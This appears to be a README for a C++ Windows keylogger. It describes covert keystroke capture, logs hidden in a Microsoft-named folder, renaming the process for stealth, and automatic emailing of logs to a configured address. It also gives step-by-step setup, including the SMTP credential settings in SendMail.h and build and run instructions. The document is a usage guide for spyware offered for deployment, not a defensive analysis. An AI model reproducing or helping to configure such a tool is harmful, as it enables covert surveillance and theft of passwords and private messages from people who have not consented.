## Features

- **Stealth Mode:** Runs silently in the background without visible windows or notifications.
- **Comprehensive Keystroke Logging:** Captures all keyboard input, including special keys, with customizable formatting.
- **Encrypted Log Files:** Multi-layered, custom Base64 encryption secures logs.
- **Automated Email Reporting:** Sends encrypted log files to a specified email address at configurable intervals.
- **Customizable Settings:** Easily adjust process name, email credentials, logging intervals, and more.
- **Selective Key Exclusion:** Exclude specific keys or combinations for privacy and compliance.

---

## Technical Overview

- **Language:** C++ (C++11 standard)
- **Platform:** Windows (Tested on Windows 7/8/10/11)
- **Keystroke Capture:** Utilizes Windows API hooks for reliable keylogging.
- **Log Storage:** Default directory is `C:\Users$$User]\AppData\Roaming\Microsoft\CLR`.
- **Email Integration:** Sends logs via SMTP using PowerShell. Supports Gmail and other providers (requires app-specific password for Gmail).

## Setup & Configuration

1. **Clone the Repository**
   ```bash
   git clone https://github.com/piyush-pine/Advanced-Keylogger-using-C-
   ```

2. **Configure Email Settings**
   - Edit `SendMail.h`:
     ```cpp
     #define X_EM_TO "receiver@email.com"
     #define X_EM_FROM "sender@gmail.com"
     #define X_EM_PASS "your_app_specific_password"
     ```
   - For Gmail, enable "App Passwords" and "Less Secure Apps" as needed.

3. **Build the Project**
   - Open in Visual Studio (or compatible IDE).
   - Build the solution (C++11 support required).

4. **Run the Keylogger**
   - Execute the compiled binary. It will start logging keystrokes and sending encrypted logs at the set interval.

## Decryption Tool

- **Decrypt Logs:** Use the included decryption utility to convert encrypted logs back to readable text.
  ```bash
  Keylogger-Decrypt.exe "encrypted.log" "decrypted.txt"
  ```
- **How It Works:** Reverses the custom multi-layer Base64 encoding applied during log encryption.

---

## Customization

- **Process Name:** Rename the executable for stealth.
- **Logging Interval:** Adjust `TimerSendMail` in `KeybHook.h` to change log sending frequency.
- **Log Formatting:** Edit `WriteAppLog` in `Helper.h` for custom log appearance.
- **Key Exclusion:** Modify `OurKeyBoardProc` to skip logging certain keys or combinations.
